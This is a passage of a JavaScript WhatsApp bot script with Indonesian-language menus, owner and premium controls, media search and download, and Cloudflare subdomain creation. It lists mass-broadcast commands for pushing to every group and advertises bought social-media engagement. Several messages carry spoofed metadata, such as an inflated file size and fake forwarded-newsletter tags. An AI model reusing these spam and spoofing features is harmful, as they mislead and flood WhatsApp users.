        Reza.sendOrder(m.chat, teksmenu, await fs.readFileSync('./media/menu.jpg'), "99999999", 10000000, null)
      }
        break
      case "mainmenu": {
        let teksmenu = `*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* listpremium
* sticker
* pinterest
* qc`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "downloadmenu": {
        let teksmenu = `*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "produkmenu": case "prd": {
        let teksmenu = `*Haii Kak* @${m.sender.split("@")[0]}!

Silahkan Pilih Salah Satu List Produk Di Bawah Ini Dengan Cara Klik Tombol *Pilih Produk*`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "single_select",
                    "buttonParamsJson": `{ "title": "Pilih Produk", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Panel Run Bot", "title": "List Harga Panel", "id": ".list_panel" }, 
{ "header": "VPS", "title": "List Harga Vps", "id": ".list_vps" }, 
{ "header": "Nokos WhatsApp", "title": "List Harga Nokos WhatsApp", "id": ".list_vps" }, 
{ "header": "Suntik Sosmed", "title": "List Harga Suntik Sosmed", "id": ".list_suntik" }, 
{ "header": "Domain", "title": "List Harga Domain", "id": ".list_domain" }, 
{ "header": "Script Bot", "title": "List Harga Script Bot", "id": ".list_scbot" }]}]}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "storemenu": {
        let teksmenu = `*乂 S T O R E M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmhidetag
* jpmhidetag2
* startjpm
* startjpmslide
* setteksjpm
* teksjpm`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Start Jpm All Grup\",\"title\":\"Start Jpm\",\"id\":\".startjpm\"}"
                  },
                  {
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Start Jpm Slide All Grup\",\"title\":\"Start Jpm Slide\",\"id\":\".startjpmslide\"}"
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "convertmenu": {
        let teksmenu = `*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "panelmenu": {
        let teksmenu = `*乂 P A N E L M E N U*
* addadmin
* addadmin2
* cpanel
* cpanel2
* listpanel
* listadmin
* deladmin
* delpanel`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel\"}"
                  },
                  {
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buat Server Panel\",\"title\":\"Buat Panel\",\"id\":\".cpanel\"}"
                  },
                  {
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Hapus Server Panel\",\"title\":\"Hapus Panel\",\"id\":\".delpanel\"}"
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "domainmenu": {
        let teksmenu = `*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "grupmenu": {
        let teksmenu = `*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Tutup Grup\",\"title\":\"Close Grup\",\"id\":\".close\"}"
                  },
                  {
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buka Grup\",\"title\":\"Open Grup\",\"id\":\".open\"}"
                  },
                  {
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                  }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "ownermenu": {
        let teksmenu = ` *Haii* @${m.sender.split("@")[0]}!
 *Selamat ${ucapan()}*

*乂 O W N E R M E N U*
* addowner
* addpremium
* delpremium
* delowner
* listowner
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* autoreadsw
* welcome
* getcase
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teksmenu
                }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  hasMediaAttachment: true,
                  documentMessage: {
                    "url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "image/png",
                    "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                    "jpegThumbnail": await fs.readFileSync("./media/menu.jpg"),
                    "fileLength": 9999999999,
                    "mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                    "fileName": `© ${namabot} ${global.version}`,
                    "directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                    "contactVcard": true,
                    "mediaKeyTimestamp": "1658703206"
                  }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Backup Script Bot\",\"title\":\"Backup Script\",\"id\":\".sc\"}"
                  },
                  {
                    "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Restarting Bot\",\"title\":\"Restart Bot\",\"id\":\".rst\"}"
                  }]
                }),
                contextInfo: {
                  isForwarded: true,
                  mentionedJid: [m.sender],
                  businessMessageForwardInfo: {
                    businessOwnerJid: global.owner
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterName: `Powered By ${namaowner2}`,
                    newsletterJid: global.idsaluran
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: null })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "trxoff": case "modeoff": {
        if (!isOwner) return SkyReply(msg.owner)
        global.owneroff = true
        SkyReply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Offline*')
      }
        break
      case "trxon": case "modeon": {
        if (!isOwner) return SkyReply(msg.owner)
        global.owneroff = false
        SkyReply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Online*')
      }
        break
      case "addowner": case "addown": {
        if (!isOwner) return SkyReply(msg.owner)
        if (m.quoted || text) {
          let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
          if (owner2.includes(orang) || orang == global.owner) return SkyReply(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
          if (orang == botNumber) return SkyReply("Tidak Bisa Menambahkan Nomor Bot Kedalam Database Owner Tambahan!")
          let check = await Reza.onWhatsApp(`${orang.split("@")[0]}`)
          if (check.length < 1) return SkyReply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
          await owner2.push(orang)
          await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
          SkyReply(`*Berhasil Menambah Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Kedalam Database Owner`)
        } else {
          SkyReply(example("@tag/6283XXX"))
        }
      }
        break
      case "delowner": case "delown": {
        if (!isOwner) return SkyReply(msg.owner)
        if (m.quoted || text) {
          if (text == "all") {
            await fs.writeFileSync("./all/database/owner.json", "[]")
            return SkyReply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
          }
          let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
          if (!owner2.includes(orang) || orang == global.owner) return SkyReply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
          if (orang == botNumber) return SkyReply("Tidak Bisa Menghapus Nomor Bot!")
          let pos = owner2.indexOf(orang)
          await owner2.splice(pos, 1)
          await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
          SkyReply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
        } else {
          SkyReply(example("@tag/6283XXX"))
        }
      }
        break
      case "addprem": case "addpremium": {
        if (!isOwner) return SkyReply(msg.owner)
        if (m.quoted || text) {
          let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
          if (premium.includes(orang)) return SkyReply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
          await premium.push(orang)
          await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
          SkyReply(`*Berhasil Menambah Premium ✅*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
        } else {
          return SkyReply(example("@tag/62838XXX"))
        }
      }
        break
      case "delprem": case "delpremium": {
        if (!isOwner) return SkyReply(msg.owner)
        if (m.quoted || text) {
          let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
          if (!premium.includes(orang)) return SkyReply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
          let indx = premium.indexOf(orang)
          await premium.splice(indx, 1)
          await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
          SkyReply(`*Berhasil Menghapus Premium ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
        } else {
          return SkyReply(example("@tag/62838XXX"))
        }
      }
        break
      case "listown": case "listowner": {
        if (owner2.length < 1) return SkyReply("Tidak Ada Owner Tambahan")
        let teksnya = `*LIST OWNER BOT⚡*\n\n`
        owner2.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
        Reza.sendMessage(m.chat, { text: teksnya, mentions: [...owner2] }, { quoted: qtoko })
      }
        break
      case "listprem": case "listpremium": {
        if (premium.length < 1) return SkyReply("Tidak Ada User Premium")
        let teksnya = `*LIST USER PREMIUM⚡*\n\n`
        premium.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
        Reza.sendMessage(m.chat, { text: teksnya, mentions: [...premium] }, { quoted: qtoko })
      }
        break
      case "tiks": case "tiktoksearch": {
        if (!text) return SkyReply(`*Masukan Teksnya!*
Contoh : *${cmd}* Story Anime`)
        await SkyReply(msg.wait)
        const tts = await fetchJson(`https://aemt.me/tiktoksearch?text=${text}`)
        if (!tts.status) return m.reply("Error Result Tidak Ditemukan")
        if (tts.result.data.length < 2) return m.reply("Error Result Tidak Ditemukan")
        let componen = new Array()
        let temp = tts.result.data.slice(0, 6)
        if (tts.result.data.length < 6) temp = tts.result.data
        for (let res of temp) {
          let vidres = await prepareWAMessageMedia({ video: await fetch(`${res.play}`) }, { upload: Reza.waUploadToServer })
          await componen.push({
            body: proto.Message.InteractiveMessage.Body.create({
              text: `
*Author :* ${res.author.nickname}
*Caption :* ${res.title}
*Total Views :* ${toRupiah(res.play_count)}`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
              hasMediaAttachment: true,
              ...vidres
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [{
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"Link Tautan\",\"url\":\"${res.play}\",\"merchant_url\":\"https://www.google.com\"}`
              }]
            })
          })
        }
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "Berikut Adalah Hasil Pencarian Dari *Tiktok 🔎*"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: componen
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: m })
        return Reza.relayMessage(m.chat, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "yts": {
        if (!text) return SkyReply(`*Masukan Teksnya!*
Contoh : *${cmd}* Story Anime`)
        await SkyReply(msg.wait)
        await yts(text).then(async (data) => {
          if (data.all.length == 0) return SkyReply(mess.error)
          let datanew = new Array()
          let txt = []
          global.tempYts = []
          let result = data.all.slice(0, 10)
          for (let i of result) {
            let tempid = await createSerial(5)
            global.tempYts.push({
              id: `${tempid}`,
              judul: `${i?.title || "unknown"}`,
              durasi: `${i?.timestamp || "unknown"}`,
              author: `${i.author?.name || "unknown"}`,
              link: i.url,
              image: i.thumbnail
            })
            txt.push(`* *ID Music :* #${tempid}
* *Judul :* ${i.title}
* *Channel :* ${i.author?.name || "unknown"}
* *Durasi :* ${i?.timestamp || "unknown"}
* *Link Url :* ${i.url}\n\n`)
          }
          for (let ii = 0; ii < result.length; ii++) {
            datanew.push({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: "\n" + txt[ii]
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: `© Powered By ${namabot2}`
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia({ image: await fetch(result[ii].thumbnail) }, { upload: Reza.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                  name: "quick_reply",
                  buttonParamsJson: `{\"display_text\":\"Play Music ID #${global.tempYts[ii].id}\",\"title\":\"Play Music\",\"id\":\".ytsplay ${global.tempYts[ii].id}\"}`
                }]
              })
            })
          }
          const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: "Berikut Adalah Hasil Pencarian Dari *Youtube 🔎*"
                  }),
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: datanew
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: m })
          return Reza.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
          })
        }).catch(err => SkyReply(err.toString()))
      }
        break
      case "ytsplay": {
        if (!text) return
        let cekdulu = await global.tempYts.find(e => e.id == text)
        if (!cekdulu) return SkyReply("ID Music Tidak Ditemukan")
        let Obj = cekdulu
        if (Obj.link == null) return y("Maaf Audio Sudah Tidak Tersedia")
        await SkyReply(`Proses Pengiriman Audio Dari *Youtube Search ID #${Obj.id}*`)
        var judul = `./all/tmp/${getRandom(".mp3")}`
        const videoURL = Obj.link
        const options = {
          quality: 'highestaudio',
          filter: 'audioonly'
        }
        ytdl(videoURL, options)
          .pipe(fs.createWriteStream(judul))
          .on('finish', async function () {
            try {
              await Reza.sendMessage(m.chat, { audio: fs.readFileSync(judul), mimetype: 'audio/mpeg', contextInfo: { mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: Obj.thumbnail, title: Obj.judul, body: `Duration : ${Obj.durasi} | Author : ${Obj.author}`, sourceUrl: Obj.link, renderLargerThumbnail: true, mediaType: 1 } } }, { quoted: m })
              await fs.unlinkSync(judul)
            } catch (e) {
              await Reza.sendMessage(m.chat, { audio: fs.readFileSync(judul), mimetype: 'audio/mpeg' }, { quoted: m })
              await fs.unlinkSync(judul)
            }
            let position = global.tempYts.indexOf(Obj)
            global.tempYts[position].link = null
          }).on('error', (err) => {
            return SkyReply(err.toString())
          })
      }
        break
      case "setppbot": case "setpp": {
        if (!isOwner) return SkyReply(msg.owner)
        if (/image/g.test(mime)) {
          let media = await Reza.downloadAndSaveMediaMessage(qmsg)
          await Reza.updateProfilePicture(botNumber, { url: media })
          await fs.unlinkSync(media)
          SkyReply("*Berhasil Mengganti Profil ✅*")
        } else return SkyReply(example('dengan mengirim foto'))
      }
        break
      case "setppbotpanjang": case "setpppanjang": {
        if (!isOwner) return SkyReply(msg.owner)
        if (/image/g.test(mime)) {
          var medis = await Reza.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
          var { img } = await generateProfilePicture(medis)
          await Reza.query({
            tag: 'iq',
            attrs: {
              to: botNumber,
              type: 'set',
              xmlns: 'w:profile:picture'
            },
            content: [
              {
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
              }
            ]
          })
          await fs.unlinkSync(medis)
          SkyReply("*Berhasil Mengganti Profil ✅*")
        } else return SkyReply(example('dengan mengirim foto'))
      }
        break
      case "setnamabot": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example('teksnya'))
        Reza.updateProfileName(text)
        SkyReply("*Berhasil Mengganti Nama Bot ✅*")
      }
        break
      case "setbio": case "setbiobot": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example('teksnya'))
        Reza.updateProfileStatus(text)
        SkyReply("*Berhasil Mengganti Bio Bot ✅*")
      }
        break
      case "listdomain": {
        var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
        SkyReply(teks)
      }
        break
      case "listsubdomain": case "listsubdo": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!args[0]) return SkyReply(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
        let zonenya
        let apinya
        let dom = args[0].toLowerCase()
        if (/domain1/.test(dom)) {
          zonenya = global.zone1
          apinya = global.apitoken1
        } else if (/domain2/.test(dom)) {
          zonenya = global.zone2
          apinya = global.apitoken2
        } else if (/domain3/.test(dom)) {
          zonenya = global.zone3
          apinya = global.apitoken3
        }
        axios.get(
          `https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
          headers: {
            Authorization: "Bearer " + `${apinya}`,
            "Content-Type": "application/json",
          },
        }).then(async (res) => {
          if (res.data.result.length < 1) return SkyReply("Tidak Ada Subdomain")
          var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
          await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
          return SkyReply(teks)
        })
      }
        break
      case "domain1": case "domain2": case "domain3": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("host|ip"))
        if (!text.split("|")) return SkyReply(example("host|ip"))
        let zonenya
        let apinya
        let tldnya
        let dom = args[0].toLowerCase()
        if (/domain1/.test(command)) {
          zonenya = global.zone1
          apinya = global.apitoken1
          tldnya = global.tld1
        } else if (/domain2/.test(command)) {
          zonenya = global.zone2
          apinya = global.apitoken2
          tldnya = global.tld2
        } else if (/domain3/.test(command)) {
          zonenya = global.zone3
          apinya = global.apitoken3
          tldnya = global.tld3
        }
        async function subDomain1(host, ip) {
          return new Promise((resolve) => {
            axios.post(
              `https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
              { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
              {
                headers: {
                  Authorization: "Bearer " + apinya,
                  "Content-Type": "application/json",
                },
              }).then((e) => {
                let res = e.data
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
              }).catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
                let err1Str = String(err1)
                resolve({ success: false, error: err1Str })
              })
          })
        }

        let raw1 = text
        if (!raw1) return SkyReply(example("host|ip"))
        let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
        if (!host1) return SkyReply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return SkyReply(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
        await subDomain1(host1.toLowerCase(), ip1).then((e) => {
          if (e['success']) SkyReply(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
          else SkyReply(`${e['error']}`)
        })
      }
        break
      case "delsubdo": case "delsubdomain": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
        if (!text.split("|")) return SkyReply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
        var [pusat, sub] = text.split("|")
        if (!pusat) return SkyReply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
        if (!sub) return SkyReply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
        var zonenya
